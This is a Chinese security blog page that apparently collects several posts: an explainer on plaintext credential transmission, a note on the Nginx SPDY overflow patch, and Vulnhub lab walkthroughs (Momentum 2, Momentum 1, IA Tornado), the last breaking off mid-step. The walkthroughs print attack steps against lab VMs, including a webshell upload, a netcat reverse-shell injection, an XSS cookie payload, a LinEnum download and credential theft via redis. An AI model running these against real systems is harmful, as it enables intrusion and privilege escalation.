<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>氕氘氚</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Open your eyes to see the light in life">
<meta property="og:type" content="website">
<meta property="og:title" content="氕氘氚">
<meta property="og:url" content="http://example.com/page/5/index.html">
<meta property="og:site_name" content="氕氘氚">
<meta property="og:description" content="Open your eyes to see the light in life">
<meta property="og:locale">
<meta property="article:author" content="Szczecin">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        





<section class="post-list">
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/15/Plaintext-Transmisson/">
                Plaintext Transmission
            </a>
        </h2>
    
    <time>
        Aug 15, 2022
    </time>
    <section class="content">
        <h1><span id="用户凭据明文传输">用户凭据明文传输</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36292543/article/details/121743138">天泽岁月</a></p>
</blockquote>
<h2><span id="漏洞描述">漏洞描述</span></h2><blockquote>
<p>用户凭据通过未加密的通道传输。当我们在网站上面提交敏感数据到服务器的过程中未进行相关加密处理，导致攻击者通过中间人攻击方式（劫持、嗅探等）【如果加密方式是常见的加密也可以解密的（比如：MD5，RSA 等–另外base64只是一种编码方式并不算是加密！】即可获取到这些未加密的敏感数据。所有经过网关的流量都可以被黑客通过嗅探（ARP欺骗）的方式抓取到。</p>
<p>当攻击者获取到这些数据之后，就可以用这些信息以合法用户的身份进入到应用系统中——甚至可能进入到应用系统后台中，一旦进入到应用系统中那么就可以获取更多的敏感数据，以及更有机会发现更多的漏洞。</p>
</blockquote>
<h2><span id="漏洞验证">漏洞验证</span></h2><blockquote>
<p>找到网站或者web系统登录页面。</p>
<p>通过过对网站登录页面的请求进行抓包，分析其数据包中相关password（密码）参数的值是否为明文。</p>
<p>工具可用burp、wireshark、filder等等，抓包分析的密码</p>
<p>浏览器的F12中的“网络”模块功能并点击HTML进行筛选，点击登录即可获取到post或者get的请求头及请求主体的内容，如下图所示，就获取到了http明文登录的敏感数据了。</p>
<p><img src="/2022/08/15/Plaintext-Transmisson/1.png" alt="image"></p>
</blockquote>
<h2><span id="修复建议">修复建议</span></h2><blockquote>
<p>由于用户凭据为敏感信息，应始终通过加密通道 (HTTPS) 传输，以避免被恶意用户拦截。因此应始终通过加密连接 (HTTPS) 将其传输到服务器。</p>
<p>如果不用 HTTPS，可以在网站前端用 Javascript 做密码加密，加密后再进行传输。(js被禁用了就GG)</p>
<p>使用正规的ca机构颁发的https证书</p>
<p>采用非对称加密方式（不可逆的加密方式）</p>
</blockquote>
<h2><span id="参考学习">参考学习</span></h2><blockquote>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_39934520/article/details/107441540">浅谈“密码明文传输”</a><br><a target="_blank" rel="noopener" href="https://blog.csdn.net/xieweikun_7/article/details/105869954">渗透测试（二）：敏感信息明文传输</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Plaintext/" rel="tag">Plaintext</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/15/CVE-2014-0133-Nginx/">
                CVE-2014-0133-Nginx
            </a>
        </h2>
    
    <time>
        Aug 15, 2022
    </time>
    <section class="content">
        <h1><span id="nginx-spdy缓冲区溢出漏洞">Nginx SPDY缓冲区溢出漏洞</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://blog.csdn.net/m0_53008479/article/details/124755846">山兔1</a> 并作补充</p>
</blockquote>
<h2><span id="注意">注意</span></h2><blockquote>
<p>nginx SPDY实现存在基于堆的缓冲区溢出，允许攻击者利用漏洞提交特殊的请求使应用程序崩溃或执行任意代码。</p>
<p>如果是漏扫，扫出来的话，是没有用的，它是根据版本来确认nginx是否存在的漏洞的，具体得登陆服务器上看。</p>
</blockquote>
<h2><span id="成因">成因</span></h2><blockquote>
<p>Nginx 1.3.15 - 1.5.11 的版本都收此漏洞影响，原因是如果<code>listen</code>指令中的<code>spdy</code>选项被配置文件所调用，则编译时会使用<code>ngx_http_spdy_module</code>模块（默认不编译），并且没有<code>--with-debug</code>配置选项。</p>
</blockquote>
<h2><span id="修复">修复</span></h2><blockquote>
<p>此漏洞已在 Nginx 1.5.12 及 1.4.7 后被修复，问题补丁如下：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">--- src/http/ngx_http_spdy.c</span><br><span class="line">+++ src/http/ngx_http_spdy.c</span><br><span class="line">@@ -1849,7 +1849,7 @@ static u_char *</span><br><span class="line"> ngx_http_spdy_state_save(ngx_http_spdy_connection_t *sc,</span><br><span class="line">     u_char *pos, u_char *end, ngx_http_spdy_handler_pt handler)</span><br><span class="line"> &#123;</span><br><span class="line">-#if (NGX_DEBUG)</span><br><span class="line">+#if 1</span><br><span class="line">     if (end - pos &gt; NGX_SPDY_STATE_BUFFER_SIZE) &#123;</span><br><span class="line">         ngx_log_error(NGX_LOG_ALERT, sc-&gt;connection-&gt;log, 0,</span><br><span class="line">                       &quot;spdy state buffer overflow: &quot;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>请更新 <a target="_blank" rel="noopener" href="https://nginx.org/en/download.html">Nginx 版本</a></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Nginx/" rel="tag">Nginx</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/15/Momentum-2/">
                Momentum 2
            </a>
        </h2>
    
    <time>
        Aug 15, 2022
    </time>
    <section class="content">
        <h1><span id="momentum2">Momentum:2</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称momentum2">名称：Momentum:2</span></h4><h4><span id="发布日期2021628">发布日期：2021.6.28</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>www-data:&#x2F;home&#x2F;athena&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt</p>
<h4><span id="难度中等">难度：中等</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名momentum2ova">文件名：Momentum2.ova</span></h4><h4><span id="文件大小698mb">文件大小：698MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentum2ova">下载地址：</span></h4><h4><span id="md5-5e837fd87d809c499911b1cb1a257cd9">MD5: 5E837FD87D809C499911B1CB1A257CD9</span></h4><h4><span id="sha1-17facc18fe6a6979159c4d0a09cc330602e81e68">SHA1: 17FACC18FE6A6979159C4D0A09CC330602E81E68</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机Momentum2和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/15/Momentum-2/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-2/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-2/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.107 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-2/4.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/5.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，发现五个可见目录，可以去看看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.107/ -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt，目录扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-2/6.png" alt="image-"></p>
</blockquote>
<h3><span id="文件上传漏洞发现">文件上传漏洞发现</span></h3><blockquote>
<p>1.访问一下dashboard.html页面，是一个上传页，会将文件传到目录&#x2F;owls下，而这个目录无法直接上传php文件，只能上传txt文件：</p>
<p><img src="/2022/08/15/Momentum-2/7.png" alt="image-"></p>
<p>2.在前端js是没有做出文件上出限制的，目录扫描到ajax.php是0kb，可以去查看ajax.php.bak文件，发现规定在cookie中做出了上传限制，则想到BP抓包修改cookie：</p>
<p><img src="/2022/08/15/Momentum-2/8.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/9.png" alt="image-"></p>
<p>ajax.php.bak代码的内容是：当cookie存在，且键名为admin时，是可以上传pdf、php、txt文件的；不过admin需要一个值，代码中已经给出了值，但是在这个值的最后还缺少一位大写的字符；此外，还要使用post方式提交一个参数secure；最后上传成功时会返回一个1</p>
<p>3.使用crunch生成一个最后一位是大写的字符字典，用于等下BP去爆破cookie；并且修改kali自带的webshell，准备上传：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">crunch 1 1 -t , -o pass.txt</span><br><span class="line">vim /usr/share/webshells/php/php-reverse-shell.php</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-2/10.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/11.png" alt="image-"></p>
</blockquote>
<h3><span id="burpsuite抓包修改">Burpsuite抓包修改</span></h3><blockquote>
<p>1.在dashboard.html选择上传php-reverse-shell.php，用BP拦截后，导入Intruder模块，加载刚才生成的字典pass.txt，并添加一个POST数据：</p>
<p><img src="/2022/08/15/Momentum-2/12.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/13.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/14.png" alt="image-"><br>2.开始爆破cookie，发现最后的大写字符是R，来到Repeater模块，添加cookie和post后发送包，在kali开启端口监听，在&#x2F;owls目录触发webshell：</p>
<p><img src="/2022/08/15/Momentum-2/15.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/16.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/17.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/18.png" alt="image-"></p>
<p>3.用python构建一个交互式shell，然后在&#x2F;home&#x2F;athena目录下可以发现第一个flag，即user.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -c &#x27;import pty;pty.spawn(&quot;/bin/bash&quot;)&#x27;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-2/19.png" alt="image-"></p>
</blockquote>
<h3><span id="root提权">root提权</span></h3><blockquote>
<p>1.查看同目录下的password-reminder.txt文件，得到一个密码提示，Asterisk是<em>的意思，可以猜测是任意字符，但其实ssh登录尝试一下就是</em>：</p>
<p><img src="/2022/08/15/Momentum-2/20.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/21.png" alt="image-"></p>
<p>2.查看当前用户权限，可以以root身份执行cookie-gen.py，查看文件，发现会将输入的值传给seed参数，然后写入到log.txt中，在echo时会执行bash命令：</p>
<p><img src="/2022/08/15/Momentum-2/22.png" alt="image-"></p>
<p>3.可以直接输入反弹shell给seed，然后kali开启对应端口监听，在&#x2F;root目录下能得到第二个flag，即root.txt：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">反弹shell：;nc 192.168.56.102 12345 -e /bin/sh;</span><br></pre></td></tr></table></figure>

<p><img src="/2022/08/15/Momentum-2/23.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-2/24.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/15/Momentum-1/">
                Momentum 1
            </a>
        </h2>
    
    <time>
        Aug 15, 2022
    </time>
    <section class="content">
        <h1><span id="momentum1">Momentum:1</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称momentum1">名称：Momentum:1</span></h4><h4><span id="发布日期2021422">发布日期：2021.4.22</span></h4><h4><span id="作者al1enum">作者：AL1ENUM</span></h4><h4><span id="系列momentum">系列：Momentum</span></h4><h4><span id="推特al1enum">推特：@AL1ENUM</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>root:&#x2F;root&#x2F;root.txt</p>
<h4><span id="难度简单">难度：简单</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名momentumova">文件名：Momentum.ova</span></h4><h4><span id="文件大小662mb">文件大小：662MB</span></h4><h4><span id="下载地址httpscybersecs3cn-north-1amazonawscomcnimagemomentummomentumova">下载地址：</span></h4><h4><span id="md5-556bea96fe2cb1506814d1e79f5c5e19">MD5: 556BEA96FE2CB1506814D1E79F5C5E19</span></h4><h4><span id="sha1-40c918a7eff2eb3cf1708428a583702a4bffd96c">SHA1: 40C918A7EFF2EB3CF1708428A583702A4BFFD96C</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机Momentum和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/15/Momentum-1/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现只开放了22和80端口，访问首页有一些图片：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.106 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/4.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-1/5.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，发现四个可见目录，可以去看看：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.106 -x html,txt,php,bak --wordlist=/usr/share/wordlists/dirb/common.txt，目录扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/6.png" alt="image-"></p>
</blockquote>
<h3><span id="xss漏洞利用">XSS漏洞利用</span></h3><blockquote>
<p>1.访问192.168.56.106&#x2F;js，发现有一个main.js，js里有个重定向链接opus-details.php?id&#x3D;，后面拼接了个参数str，而这个php是主页图片点击后再点击一次的详情介绍：</p>
<p><img src="/2022/08/15/Momentum-1/7.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-1/8.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-1/9.png" alt="image-"></p>
<p>2.拼接的str字串会被直接打印出来，因为是js下进行构建的，首先想到xss，构造xss的payload爆出cookie：</p>
<p><img src="/2022/08/15/Momentum-1/10.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload：&lt;script&gt;alert(document.cookie)&lt;/script&gt;</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/11.png" alt="image-"></p>
<p>3.这cookie明显是进行了加密，回到main.js有提示，使用的是aes，进行解密得到很像用户名-密码的形式的字串auxerre-alienum##：</p>
<p><img src="/2022/08/15/Momentum-1/12.png" alt="image-"></p>
</blockquote>
<h3><span id="ssh登录准备提权">SSH登录，准备提权</span></h3><blockquote>
<p>1.因为靶机有开放22端口，利用ssh登录，发现用户auxerre的密码就是auxerre-alienum##：</p>
<p><img src="/2022/08/15/Momentum-1/13.png" alt="image-"></p>
<p>2.接下来我们要使用LinEnum.sh这个工具对靶机进行进一步信息收集，在kali搭建一个http服务，准备上传工具到靶机<br>（工具地址：<a target="_blank" rel="noopener" href="https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh%EF%BC%89%EF%BC%9A">https://github.com/rebootuser/LinEnum/blob/master/LinEnum.sh）：</a></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server 8001，kali开启http服务</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/14.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget http://192.168.56.102:8001/LinEnum.sh，靶机下载工具（文件在桌面）</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/15.png" alt="image-"></p>
<p>3.添加权限，靶机运行LinEnum.sh后，查看输出信息，发现6379端口占用，此端口是数据库redis的默认端口，确认后可以尝试kali登录redis：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">chmod +x LinEnum.sh</span><br><span class="line">./LinEnum.sh &gt; 1.txt</span><br><span class="line">cat 1.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/16.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-1/17.png" alt="image-"></p>
<p><img src="/2022/08/15/Momentum-1/18.png" alt="image-"></p>
<p>4.现在我们可以尝试利用ssh远程连接6379端口，然后在kali端登录，这里kali同样使用6379端口：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 6379:127.0.0.1:6379 auxerre@192.168.56.106</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/19.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">redis-cli -h 127.0.0.1 -p 6379</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/20.png" alt="image-"></p>
</blockquote>
<h3><span id="root提权">root提权</span></h3><blockquote>
<p>1.我们可以在数据库内看到一个rootpass键，而键内包含着很像是密码的字串，使用root用户登录，成功提权：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">keys *</span><br><span class="line">get rootpass</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/Momentum-1/21.png" alt="image-"></p>
<p>2.进行root登录，在&#x2F;root目录下能找到flag，即root.txt：</p>
<p><img src="/2022/08/15/Momentum-1/22.png" alt="image-"></p>
</blockquote>


        

        
            <div class="tags">
                <a class="tag-none-link" href="/tags/Momentum/" rel="tag">Momentum</a><a class="tag-none-link" href="/tags/Vulnhub/" rel="tag">Vulnhub</a><a class="tag-none-link" href="/tags/WriteUp/" rel="tag">WriteUp</a>
            </div>
        

    </section>
</article>
  
    <article class="post ">

    
        <h2 class="title">
            <a href="/2022/08/15/IA-Tornado/">
                IA Tornado
            </a>
        </h2>
    
    <time>
        Aug 15, 2022
    </time>
    <section class="content">
        <h1><span id="ia-tornado">IA: TORNADO</span></h1><h2><span id="一-基本信息">一、基本信息</span></h2><blockquote>
<h4><span id="名称ia-tornado">名称：IA: Tornado</span></h4><h4><span id="发布日期20201220">发布日期：2020.12.20</span></h4><h4><span id="作者infosec-articles">作者：InfoSec Articles</span></h4><h4><span id="系列ia">系列：IA</span></h4><h4><span id="推特-infosecarticles">推特: @infosecarticles</span></h4></blockquote>
<h2><span id="二-靶机简介">二、靶机简介</span></h2><blockquote>
<h4><span id="flags">Flags：</span></h4><p>catchme:&#x2F;~&#x2F;user.txt<br>root:&#x2F;root&#x2F;root.txt </p>
<h4><span id="难度中等">难度：中等</span></h4></blockquote>
<h2><span id="三-文件信息">三、文件信息</span></h2><blockquote>
<h4><span id="文件名tornadoova">文件名：tornado.ova</span></h4><h4><span id="文件大小1019mb">文件大小：1019MB</span></h4><h4><span id="下载地址httpsdownloadvulnhubcomiatornadoova">下载地址：</span></h4><h4><span id="md5-86b49bd71057db337a85c1ec1bab1076">MD5: 86B49BD71057DB337A85C1EC1BAB1076</span></h4><h4><span id="sha1-a74d80b7bde2b4da63aaf1e6b4714e43d6862409">SHA1: A74D80B7BDE2B4DA63AAF1E6B4714E43D6862409</span></h4></blockquote>
<h2><span id="四-镜像信息">四、镜像信息</span></h2><blockquote>
<h4><span id="格式virtual-machine-virtualbox-ova">格式：Virtual Machine (Virtualbox - OVA)</span></h4><h4><span id="操作系统linuxdebain">操作系统：Linux(debain)</span></h4></blockquote>
<h2><span id="五-网络信息">五、网络信息</span></h2><blockquote>
<h4><span id="dhcp服务可用">DHCP服务：可用</span></h4><h4><span id="ip地址自动分配">IP地址：自动分配</span></h4></blockquote>
<h2><span id="六-环境配置">六、环境配置</span></h2><blockquote>
<p>1.将靶机tornado和攻击机kali2021在VirtualBox下设置为仅主机模式，使用DHCP分配ip地址：</p>
<p><img src="/2022/08/15/IA-Tornado/1.png" alt="image-"></p>
</blockquote>
<h2><span id="七-攻略步骤">七、攻略步骤</span></h2><h3><span id="信息探测">信息探测</span></h3><blockquote>
<p>1.因为是没有直接告知我们靶机ip的，所以要先进行主机探测，先查看下kali分配到的ip，在进行网段扫描，命令如下，得到靶机ip为192.168.56.102：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ifconfig，查看kali分配到的ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/2.png" alt="image-"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sP 192.168.56.0/24，扫描靶机ip</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/3.png" alt="image-"></p>
<p>2.再进行端口扫描，发现只开放了22和80端口，访问主页，还是Apache初始页，源码没有更多信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -T4 -sC -sV -p- --min-rate=1000 192.168.56.132 | tee nmapscan，端口扫描</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/4.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Tornado/5.png" alt="image-"></p>
<p>3.最后再进行一下目录扫描，发现&#x2F;bluesky目录，页面源码也没发现更多可用信息：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132 -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/6.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Tornado/7.png" alt="image-"></p>
</blockquote>
<h3><span id="文件包含漏洞发现">文件包含漏洞发现</span></h3><blockquote>
<p>1.我们继续对&#x2F;bluesky目录进行扫描，发现有登录页与注册页，我们在注册页随意注册然后登录：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://192.168.56.132/bluesky -x html,php,bak,txt --wordlist /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/8.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Tornado/9.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Tornado/10.png" alt="image-"></p>
<p>2.登录后，在PORTFOLIO页能发现提示存在LFI，并且在源码内有路径提示：</p>
<p><img src="/2022/08/15/IA-Tornado/11.png" alt="image-"></p>
<p>3.利用LFI，我们可以获取到一些登录账号：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.56.132/~tornado/imp.txt</span><br></pre></td></tr></table></figure>
<p><img src="/2022/08/15/IA-Tornado/12.png" alt="image-"></p>
</blockquote>
<h3><span id="sql截断攻击">SQL截断攻击</span></h3><blockquote>
<p>1.然而，当我们使用这些账号，会发现这些账号都已经被注册了，这时我在注册页源码发现前端对email长度做了最大限制：</p>
<p><img src="/2022/08/15/IA-Tornado/13.png" alt="image-"></p>
<p>2.这时可以想到是否存在SQL截断攻击的利用，修改maxlength后测试发现，能够将jacob@tornado用户的密码更改：</p>
<p><img src="/2022/08/15/IA-Tornado/14.png" alt="image-"></p>
<p><img src="/2022/08/15/IA-Tornado/15.png" alt="image-"></p>
<p>3.成功登录到jacob@tornado：</p>
<p><img src="/2022/08/15/IA-Tornado/16.png" alt="image-"></p>
</blockquote>
<h3><span id="命令注入构建shell">命令注入，构建shell</span></h3><blockquote>
<p>1.现在我们可以在CONTACT页面输入payload，并在kali开启对应监听，获得shell：</p>
<p><img src="/2022/08/15/IA-Tornado/17.png" alt="image-"></p>
